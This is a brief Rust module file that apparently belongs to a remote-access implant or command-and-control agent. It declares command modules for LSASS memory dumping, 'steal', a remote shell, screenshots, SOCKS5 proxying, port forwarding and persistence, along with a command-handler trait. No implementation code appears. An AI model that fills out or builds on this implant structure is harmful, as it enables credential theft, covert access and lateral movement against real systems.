use anyhow::Result;
use serde_json::Value;

pub mod file_download;
pub mod file_list;
#[cfg(target_os = "windows")]
pub mod lsass_dump;
pub mod persist_remove;
pub mod persist_status;
#[cfg(feature = "http-transport")]
pub mod portfwd;
pub mod process_list;
pub mod screenshot;
pub mod shell;
#[cfg(feature = "http-transport")]
pub mod socks5;
pub mod steal;

pub trait CommandHandler: Send + Sync {
    fn execute(&self, args: Value) -> Result<Value>;
}
